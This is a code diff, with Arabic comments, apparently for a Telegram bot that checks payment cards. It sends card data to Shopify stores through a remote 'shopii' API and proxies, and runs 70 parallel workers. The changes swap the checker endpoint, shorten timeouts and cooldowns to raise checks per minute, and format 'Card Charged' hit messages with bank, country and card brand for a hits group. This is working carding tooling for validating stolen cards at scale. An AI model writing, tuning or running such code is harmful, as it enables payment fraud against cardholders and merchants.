@@ -84,12 +84,12 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# استخدام الـ API الموحد الخاص بك
-SHOPIFY_API_URL_1 = 'https://autosh.up.railway.app/shopii'
+# [تم التحديث بالكامل] تم تركيب رابط الـ Railway الخاص بك بالصيغة والامتداد الصحيح تماماً للفحص بدون أخطاء
+SHOPIFY_API_URL_1 = 'https://apigccggfg-production.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-# إعدادات السرعة الفائقة المطلوبة
+# إعدادات السرعة الفائقة المعتمدة لـ 70 خيط متوازي وثبات الـ CPM
 WORKERS = 70  
 DELAY = 1.6  
 HIT_DELAY = 1.0
@@ -163,7 +163,8 @@ CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
 CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
 CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
 CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
-CE_CLOWN = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
+CE_CONTAINER = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
+CE_CLOWN = CE_CONTAINER
 CE_FLY = '<tg-emoji emoji-id="5231449120635370684">💸</tg-emoji>'
 CE_SHIELD = '<tg-emoji emoji-id="5251203410396458957">🛡️</tg-emoji>'
 CE_SEARCH = '<tg-emoji emoji-id="5231012545799666522">🔍</tg-emoji>'
@@ -363,9 +364,7 @@ _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
-        # [تعديل السرعة] إلغاء force_close لتفعيل البولينج (Connection Pooling) وإعادة استخدام الاتصالات المفتوحة فورا
         connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
-        # [تعديل السرعة] تقليص التايم أوت الكلي لـ 15 ثانية فقط بدلا من 90 لإنقاذ الـ CPM وتخطي البروكسيات الميتة بسرعة خيالية
         _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15, connect=5, sock_read=10), connector=connector)
     return _USER_HTTP_SESSIONS[key]
 
@@ -600,7 +599,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                         event.clear()  
                         async def resume_workers():
                             global _IS_COOLING_DOWN
-                            # [تعديل السرعة] تقليص التجميد الكلي عند الخطأ لـ 2 إلى 4 ثواني فقط بدلاً من 16 ثانية لضمان انطلاقة مرعبة للـ CPM
                             await asyncio.sleep(random.uniform(2.0, 4.0)) 
                             _IS_COOLING_DOWN = False
                             event.set()
@@ -652,6 +650,7 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
 
 <b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
+# إرسال إشعار الصيد الحصري لقروب الهيتس بالإيموجيات المتحركة الكاملة والمبلغ بدقة متناهية وبدون خطأ لبطاقات Charged فقط
 async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, response_msg="Card Charged"):
     if not HITS_GROUP_TARGET: return
     try:
@@ -677,7 +676,7 @@ async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, res
 
 <b>{CE_GEAR} {sf('Details')}:</b>
  ├ <b>{sf('Bank')}:</b> <code>{bank}</code>
- ├ <b>{sf('Country')}:</b> <code>{sf(bi.get('country', '-'))} {flag}</code>
+ ├ <b>{sf('Country')} :</b> <code>{sf(bi.get('country', '-'))} {flag}</code>
  ╰ <b>{sf('Brand')}:</b> <code>{brand}</code>
 
 <b>{CE_MAN} {sf('Spun By')}:</b> <a href="tg://user?id={uid}">{sf(safe_name)}</a> | ⚡ <code>{sf(plan_name)}</code>
@@ -1134,7 +1133,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
 
     async def dashboard_updater():
         while not is_stopped():
-            # [تعديل السرعة] تقليص زمن تحديث لوحة التحكم ليكون أسرع وأخف، مما يعطي دفعات إضافية للـ CPM بدون تعليق البوت
             for _ in range(20):
                 if is_stopped(): break
                 await asyncio.sleep(0.1)
@@ -1193,7 +1191,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-                    # [تعديل السرعة] جعل الـ Delay المطلبق انسيابي وخفيف لمطابقة طلب الـ 1.6 دون خنق الـ 70 عامل بالتوازي
                     if not is_stopped(): await asyncio.sleep(DELAY / WORKERS)
 
     wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
